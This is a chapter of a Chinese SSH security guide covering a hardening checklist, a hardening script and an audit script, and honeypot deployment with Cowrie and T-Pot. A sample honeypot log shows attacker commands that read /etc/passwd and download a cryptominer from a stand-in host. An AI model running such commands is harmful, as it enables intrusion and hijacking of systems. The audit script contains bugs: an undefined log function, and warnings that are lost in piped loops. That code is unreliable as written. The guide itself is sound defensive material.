## 第 6 章：自动化防御：让你的 SSH 永不裸奔

### 6.1 加固 Checklist：从协议层到应用层

**协议层**：
- [ ] 升级 OpenSSH 到最新稳定版（8.x 或 9.x）
- [ ] 禁用 SSH v1 协议（默认已禁）
- [ ] 禁用弱加密算法（3DES、RC4）
- [ ] 禁用弱 MAC 算法（MD5、96-bit HMAC）
- [ ] 使用 ChaCha20-Poly1305 或 AES-GCM

**认证层**：
- [ ] 禁用密码认证（`PasswordAuthentication no`）
- [ ] 启用公钥认证
- [ ] 强制 2FA（密钥 + TOTP/YubiKey）
- [ ] 禁止 root 登录（`PermitRootLogin no`）
- [ ] 限制允许登录的用户（`AllowGroups ssh-users`）
- [ ] 设置强 MaxAuthTries（3-5）
- [ ] 设置登录超时（`LoginGraceTime 30`）

**网络层**：
- [ ] 改默认端口（卫生措施）
- [ ] 防火墙限制来源 IP（`nftables` / 安全组）
- [ ] fail2ban 或 CrowdSec 已部署
- [ ] 订阅黑名单（firehol level1）

**系统层**：
- [ ] PAM 限制（`pam_faillock`、`pam_access`）
- [ ] auditd 监控关键事件
- [ ] 文件完整性监控（AIDE）
- [ ] logwatch 或 SIEM 已部署

**运维层**：
- [ ] SSH 密钥定期轮换（建议 6-12 个月）
- [ ] 应急访问机制（不依赖主流程）
- [ ] 备份 SSH 配置和 authorized_keys
- [ ] 团队安全培训

### 6.2 一键加固脚本的设计哲学：幂等、可审计、可回滚

**幂等（Idempotent）**：脚本重复执行结果一致
- 不是首次执行加规则，再次执行再加一遍
- 而是脚本判断当前状态，缺什么补什么

**可审计**：脚本执行有日志
- 每次执行记录时间、变更项
- 用 git 管理所有配置变更

**可回滚**：脚本有对应的 rollback 操作
- 每个变更前先备份
- 失败时自动回滚

**示例加固脚本（伪代码）**：

```bash
#!/bin/bash
# ssh_hardening.sh - SSH 一键加固
# 设计原则：幂等、可审计、可回滚

set -euo pipefail

BACKUP_DIR="/var/backups/ssh_hardening_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="/var/log/ssh_hardening.log"

log() { echo "[$(date '+%F %T')] $*" | tee -a "$LOG_FILE"; }

# 1. 备份原配置
mkdir -p "$BACKUP_DIR"
cp -a /etc/ssh "$BACKUP_DIR/"
log "Backed up /etc/ssh to $BACKUP_DIR"

# 2. 应用安全配置（幂等写法）
SSHD_CONFIG="/etc/ssh/sshd_config"

ensure_sshd_setting() {
    local key="$1"
    local value="$2"
    if grep -qE "^\s*#?\s*${key}\s+" "$SSHD_CONFIG"; then
        sed -i "s|^\s*#\?\s*${key}\s\+.*|${key} ${value}|" "$SSHD_CONFIG"
        log "Updated: $key $value"
    else
        echo "$key $value" >> "$SSHD_CONFIG"
        log "Added: $key $value"
    fi
}

ensure_sshd_setting "Protocol" "2"
ensure_sshd_setting "PermitRootLogin" "no"
ensure_sshd_setting "PasswordAuthentication" "no"
ensure_sshd_setting "PubkeyAuthentication" "yes"
ensure_sshd_setting "MaxAuthTries" "3"
ensure_sshd_setting "LoginGraceTime" "30"
ensure_sshd_setting "MaxSessions" "5"
ensure_sshd_setting "AllowGroups" "ssh-users"
ensure_sshd_setting "ChallengeResponseAuthentication" "no"
ensure_sshd_setting "KerberosAuthentication" "no"
ensure_sshd_setting "GSSAPIAuthentication" "no"
ensure_sshd_setting "X11Forwarding" "no"
ensure_sshd_setting "AllowTcpForwarding" "no"
ensure_sshd_setting "AllowAgentForwarding" "no"

# 3. 验证配置
sshd -t && log "Config validation passed" || (log "Config validation failed"; exit 1)

# 4. 重启 sshd
systemctl reload sshd
log "sshd reloaded"

# 5. 失败回滚提示
cat << EOF
=========================================
加固完成！备份在: $BACKUP_DIR
如有连接问题，请在新会话中验证后再退出当前会话
回滚命令: cp -a $BACKUP_DIR/ssh/* /etc/ssh/ && systemctl restart sshd
=========================================
EOF
```

**关键点**：
- **永远保留另一个会话**：加固脚本运行前先开第二个 SSH 会话，验证加固后仍能登录，再退出第一个会话
- **不要在脚本运行后立刻退出当前会话**：如果配置错误，可能被锁在外面

### 6.3 定期巡检脚本：自动化安全基线检查

```bash
#!/bin/bash
# ssh_audit.sh - SSH 安全基线检查

WARNINGS=()

# 1. 检查密码认证
if sshd -T 2>/dev/null | grep -q "passwordauthentication yes"; then
    WARNINGS+=("[CRITICAL] PasswordAuthentication is enabled")
fi

# 2. 检查 root 登录
if sshd -T 2>/dev/null | grep -q "permitrootlogin yes"; then
    WARNINGS+=("[CRITICAL] PermitRootLogin is enabled")
fi

# 3. 检查 MaxAuthTries
MAX_AUTH=$(sshd -T 2>/dev/null | grep "^maxauthtries" | awk '{print $2}')
if [ "$MAX_AUTH" -gt 5 ]; then
    WARNINGS+=("[WARNING] MaxAuthTries is $MAX_AUTH (recommend ≤ 5)")
fi

# 4. 检查 SSH 版本
SSH_VERSION=$(sshd -V 2>&1 | head -1)
log "OpenSSH version: $SSH_VERSION"

# 5. 检查 authorized_keys 文件权限
find /home /root -name "authorized_keys" -perm /o+w 2>/dev/null | while read f; do
    WARNINGS+=("[WARNING] authorized_keys world-writable: $f")
done

# 6. 检查 .ssh 目录权限
find /home /root -type d -name ".ssh" -perm /o+rw 2>/dev/null | while read d; do
    WARNINGS+=("[WARNING] .ssh directory world-accessible: $d")
done

# 7. 检查 SSH banner 是否暴露版本
BANNER=$(sshd -T 2>/dev/null | grep "^banner" | awk '{print $2}')
if [ -z "$BANNER" ]; then
    # 检查 banner 内容
    if grep -q "^DebianBanner" /etc/ssh/sshd_config; then
        WARNINGS+=("[INFO] DebianBanner is configured")
    fi
fi

# 8. 检查 fail2ban 状态
if ! systemctl is-active fail2ban >/dev/null 2>&1; then
    WARNINGS+=("[WARNING] fail2ban is not active")
fi

# 9. 检查 auditd 状态
if ! systemctl is-active auditd >/dev/null 2>&1; then
    WARNINGS+=("[WARNING] auditd is not active")
fi

# 输出报告
echo "===== SSH 安全基线检查报告 ====="
for w in "${WARNINGS[@]}"; do
    echo "$w"
done
echo "================================="
```

**配合 cron 每周跑一次**：

```bash
echo "0 9 * * 1 root /usr/local/bin/ssh_audit.sh | mail -s 'Weekly SSH Audit' admin@example.com" > /etc/cron.d/ssh_audit
```

### 6.4 蜜罐部署：观察攻击者 TTP 的实战价值

**蜜罐（Honeypot）** 是诱捕攻击者的"陷阱系统"。它模拟真实的 SSH 服务，记录攻击者的所有行为，用于：
- 研究攻击者的 TTP（Tactics, Techniques, Procedures）
- 提前获得威胁情报（攻击者用了什么新工具、新字典）
- 转移攻击者的注意力（让他们花时间在蜜罐上）

#### 6.4.1 Cowrie SSH 蜜罐的部署

**Cowrie**（github.com/cowrie/cowrie）是一个成熟的 SSH/Telnet 蜜罐，模拟一个完整的伪文件系统。

```bash
# 安装
git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# 配置
cp etc/cowrie.cfg.dist etc/cowrie.cfg
# 编辑 cowrie.cfg 修改端口、监听地址等

# 启动
bin/cowrie start

# 验证：尝试连接蜜罐
ssh -p 2222 root@localhost
# 输入任意密码，应该被"接受"，进入伪造的 shell
```

**Cowrie 记录的内容**：
- 攻击者输入的所有命令
- 攻击者下载的所有文件
- 攻击者尝试的所有用户名/密码
- 攻击者的 IP、登录时间、协议

**Cowrie 输出的典型日志**：

```
2026-07-19 03:14:22+0800 [SSHService ssh-userauth on HoneyPotTransport,0,ip] login attempt [axu/123456] succeeded
2026-07-19 03:14:25+0800 [SSHService ssh-userauth on HoneyPotTransport,0,ip] login attempt [axu/password] succeeded
2026-07-19 03:14:30+0800 [SSHService ssh-exec on HoneyPotTransport,0,ip] CMD: uname -a
2026-07-19 03:14:32+0800 [SSHService ssh-exec on HoneyPotTransport,0,ip] CMD: cat /etc/passwd
2026-07-19 03:14:35+0800 [SSHService ssh-exec on HoneyPotTransport,0,ip] CMD: wget http://malicious.com/xmrig.tar.gz
```

#### 6.4.2 T-Pot 集成部署

**T-Pot**（github.com/telekom-security/tpotce）是多蜜罐集成平台，把 Cowrie、Dionaea、Honeytrap 等 20+ 蜜罐打包到一个 Docker 平台里：

```bash
# 一键部署 T-Pot（要求至少 8GB 内存，2 核 CPU）
git clone https://github.com/telekom-security/tpotce.git
cd tpotce
./install.sh

# 默认 Web UI 在 https://<server-ip>:64297
# 内置 Kibana、ElasticSearch、Grafana
```

**T-Pot 的价值**：
- 一次性看到 20+ 种蜜罐捕获的攻击
- 内置可视化仪表板
- 内置 ELK 集成
- 适合：暴露面监控、威胁情报收集、安全研究

**蜜罐部署的最佳实践**：
- 蜜罐**独立于生产网络**——它被攻破不应该影响业务
- 给蜜罐**单独的 IP 段**，方便识别蜜罐流量
- 蜜罐内部**没有真实业务**——攻击者拿到"权限"也只能在伪文件系统里逛
- 蜜罐的日志**集中到独立 SIEM**——攻击者可能清理蜜罐日志
- 蜜罐自身**持续更新**——新攻击 TTP 需要新检测

---

